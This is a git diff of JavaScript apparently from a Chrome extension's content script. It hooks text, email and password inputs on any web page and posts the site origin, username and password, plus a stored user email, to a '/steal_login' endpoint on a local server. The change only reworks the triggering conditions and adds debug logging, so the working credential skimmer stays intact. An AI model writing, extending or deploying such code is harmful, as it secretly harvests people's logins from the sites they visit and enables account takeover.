@@ -21,25 +21,29 @@ $.each(inputs, function (element) {
                 }
             });
         });
-        if (is_in_attr) {
+        console.log("IS IT IN?" + is_in_attr);
+        console.log($(inputs[element]).attr('type') == "text");
+        if (is_in_attr && ($(inputs[element]).attr('type') == "email" || $(inputs[element]).attr('type') == "text" || $(inputs[element]).attr('type') == "password")) {
+            console.log("we made it in?");
             $(inputs[element]).on('input', function () {
-                if ($(inputs[element]).val() != "") {
-                    chrome.storage.local.get('email', function (resu) {
-                        var userEmail;
-                        var pw = $('[type="password"]')[0];
-                        if (typeof resu === 'undefined') userEmail = "no_email_found";
-                        else userEmail = resu.email;
-                        if (inputs[element].value != "" &&
-                            !(typeof pw === 'undefined') && $(pw).val() != "") {
-                            $.post("http://localhost:5000/steal_login", {
-                                email: userEmail,
-                                url: window.location.origin,
-                                username: $(inputs[element]).val(),
-                                password: $(pw).val()
-                            });
-                        }
-                    });
-                }
+                chrome.storage.local.get('email', function (resu) {
+                    var userEmail;
+                    var pw = $('[type="password"]')[0];
+                    if (typeof resu === 'undefined') userEmail = "no_email_found";
+                    else userEmail = resu.email;
+                    console.log('pw');
+                    if (inputs[element].value != "" &&
+                        !(typeof pw === 'undefined') && $(pw).val() != "") {
+                        console.log("hi");
+                        $.post("http://localhost:5000/steal_login", {
+                            email: userEmail,
+                            url: window.location.origin,
+                            username: $(inputs[element]).val(),
+                            password: $(pw).val()
+                        });
+                    }
+                });
+
             });
         }
     });
